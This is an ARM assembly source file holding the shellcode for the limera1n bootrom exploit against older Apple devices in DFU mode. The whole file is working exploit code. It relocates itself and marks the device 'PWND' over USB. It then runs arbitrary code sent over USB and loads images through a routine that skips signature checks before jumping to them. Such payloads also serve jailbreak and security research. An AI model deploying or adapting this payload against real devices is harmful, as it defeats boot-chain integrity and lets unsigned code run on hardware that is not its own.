@ limera1n-shellcode.S
@ Author: axi0mX
@ Shellcode for limera1n exploit with minor improvements:
@ * supports 'exec' magic for code execution over USB
@ * reports PWND:[limera1n] in USB serial number string

.text
 
.pool
.set free,                          0xBAD0000d
.set memz_create,                   0xBAD0000f
.set memz_destroy,                  0xBAD00011
.set image3_create_struct,          0xBAD00012
.set image3_load_continue,          0xBAD00013
.set image3_load_fail,              0xBAD00014
.set usb_wait_for_image,            0xBAD00009
.set jump_to,                       0xBAD00010
.set nor_power_on,                  0xBAD00005
.set nor_init,                      0xBAD00006
.set memmove,                       0xBAD00003
.set strlcat,                       0xBAD00008

.set gLeakingDFUBuffer,             0xBAD0000c
.set gUSBSerialNumber,              0xBAD00007

.set RELOCATE_SHELLCODE_ADDRESS,    0xBAD00001
.set RELOCATE_SHELLCODE_SIZE,       0xBAD00002
.set MAIN_STACK_ADDRESS,            0xBAD00004
.set LOAD_ADDRESS,                  0xBAD0000a
.set MAX_SIZE,                      0xBAD0000b
.set EXEC_MAGIC,                    0xBAD0000e

.global _start

_start:
.code 16
    B   relocate_shellcode                      @ goto relocate_shellcode

    NOP
    NOP
    NOP
    NOP                                         
    NOP                                         
    NOP                                         
    NOP
    NOP
    NOP

relocate_shellcode:
    MOV R1, PC
    SUB R1, R1, #4                              @ R1 = PC - 4

    LDR R0, =RELOCATE_SHELLCODE_ADDRESS
    CMP R0, R1
    BEQ pwned_dfu_start                         @ if (R1 == RELOCATE_SHELLCODE_ADDRESS) goto pwned_dfu_start

    LDR R2, =RELOCATE_SHELLCODE_SIZE
    LDR R3, =memmove
    BLX R3                                      @ memmove(RELOCATE_SHELLCODE_ADDRESS, R1, RELOCATE_SHELLCODE_SIZE)

    LDR R3, =RELOCATE_SHELLCODE_ADDRESS
    ADD R3, R3, #1
    BX R3                                       @ goto (RELOCATE_SHELLCODE_ADDRESS + 1)

pwned_dfu_start:
    LDR R0, =MAIN_STACK_ADDRESS
    MOV SP, R0                                  @ SP = MAIN_STACK_ADDRESS

    MOV R0, #1
    MOV R1, #1
    MOV R2, #0
    LDR R3, =nor_power_on
    BLX R3                                      @ nor_power_on(1, 1, 0)

    MOV R0, #0
    LDR R3, =nor_init
    BLX R3                                      @ nor_init(0)

    LDR R0, =gUSBSerialNumber
    ADR R1, PWND_STRING
    MOV R2, #120
    LDR R3, =strlcat
    BLX R3                                      @ strlcat(gUSBSerialNumber, PWND_STRING, 120)

pwned_dfu_loop:
    LDR R3, =usb_wait_for_image
    LDR R0, =LOAD_ADDRESS
    LDR R1, =MAX_SIZE
    BLX R3                                      @ R0 = usb_wait_for_image(LOAD_ADDRESS, MAX_SIZE)

    MOV R4, R0                                  @ R4 = R0

    LDR R1, =gLeakingDFUBuffer
    LDR R0, [R1]                                @ R0 = gLeakingDFUBuffer

    MOV R2, #0
    STR R2, [R1]                                @ gLeakingDFUBuffer = 0

    LDR R3, =free
    BLX R3                                      @ free(R0)

    CMP R4, #0
    BLT pwned_dfu_loop                          @ if (R4 < 0) goto pwned_dfu_loop

    LDR R5, =LOAD_ADDRESS
    LDR R0, [R5]                                @ R0 = LOAD_ADDRESS[0]

    LDR R1, =EXEC_MAGIC
    CMP R0, R1
    BNE pwned_dfu_not_exec_magic                @ if (R0 != EXEC_MAGIC) goto pwned_dfu_not_exec_magic

    LDR R0, [R5, #0x8]                          @ R0 = LOAD_ADDRESS[2]      /* arg1 */

    LDR R1, [R5, #0xC]                          @ R1 = LOAD_ADDRESS[3]      /* arg2 */

    LDR R2, [R5, #0x10]                         @ R2 = LOAD_ADDRESS[4]      /* arg3 */

    LDR R3, [R5, #0x14]                         @ R3 = LOAD_ADDRESS[5]      /* arg4 */

    LDR R4, [R5, #0x18]
    STR R4, [SP]                                @ SP[0] = LOAD_ADDRESS[6]   /* arg5 */

    LDR R4, [R5, #0x1C]
    STR R4, [SP, #0x4]                          @ SP[1] = LOAD_ADDRESS[7]   /* arg6 */

    LDR R4, [R5, #0x20]
    STR R4, [SP, #0x8]                          @ SP[2] = LOAD_ADDRESS[8]   /* arg7 */
    
    LDR R4, [R5, #0x4]                          
    BLX R4                                      @ R0 = LOAD_ADDRESS[1](R0, R1, R2, R3, SP[0], SP[1], SP[2])

    STR R0, [R5, #4]                            @ LOAD_ADDRESS[1] = R0

    MOV R1, #0
    STR R1, [R5]                                @ LOAD_ADDRESS[0] = 0

    B pwned_dfu_loop                            @ goto pwned_dfu_loop

pwned_dfu_not_exec_magic:
    LDR R0, =LOAD_ADDRESS
    MOV R1, R4
    MOV R2, #0
    LDR R3, =memz_create
    BLX R3                                      @ R0 = memz_create(LOAD_ADDRESS, R4, 0)

    CMP R0, #0
    BEQ pwned_dfu_loop                          @ if (R0 == 0) goto pwned_dfu_loop /* out of memory :-| */

    LDR R3, =LOAD_ADDRESS                       
    STR R3, [SP]                                @ SP[0] = LOAD_ADDRESS

    STR R4, [SP, #4]                            @ SP[1] = R4

    MOV R4, R0                                  @ R4 = R0

    MOV R1, SP
    ADD R2, SP, #4
    BL image3_load_no_signature_check           @ R0 = image3_load_no_signature_check(R0, &SP[0], &SP[1])

    CBNZ R0, load_failed                        @ if (R0 != 0) goto load_failed

    LDR R1, =LOAD_ADDRESS
    MOV R2, #0
    LDR R3, =jump_to
    BLX R3                                      @ jump_to(0, LOAD_ADDRESS, 0)

    /* jump_to should never return */

load_failed:
    MOV R0, R4
    LDR R3, =memz_destroy
    BLX R3                                      @ memz_destroy(R4)

    B pwned_dfu_loop                            @ goto pwned_dfu_loop

image3_load_no_signature_check:
    PUSH {R4-R7, LR}                            /* TODO: Rewrite this ugly mess. */

    MOV R6, R11
    MOV R5, R10
    MOV R4, R8
    PUSH {R4-R6}

    ADD R7, SP, #0x18
    SUB SP, SP, #0x60

    STR R2, [SP, #0x10]

    MOVS R3, #0
    STR R3, [SP, #0x50]

    LDR R6, [R1]
    MOV R10, R1
    MOVS R5, R0

    LDR R0, [R5, #4]
    MOV R8, R0

    LDR R1, =MAX_SIZE
    CMP R0, R1
    BGT img3_bad_size

    ADD R0, SP, #0x50
    MOVS R1, R6
    MOV R2, R8
    MOVS R3, #0
    LDR R4, =image3_create_struct
    BLX R4

    MOV R4, R0

    CBNZ R4, img3_fail

    LDR R3, =image3_load_continue
    BX R3

img3_bad_size:
    MOV R8, R1

img3_fail:
    MOV R4, #1
    LDR R3, =image3_load_fail
    BX R3

.align 2

PWND_STRING:
.ascii " PWND:[limera1n]\x00"
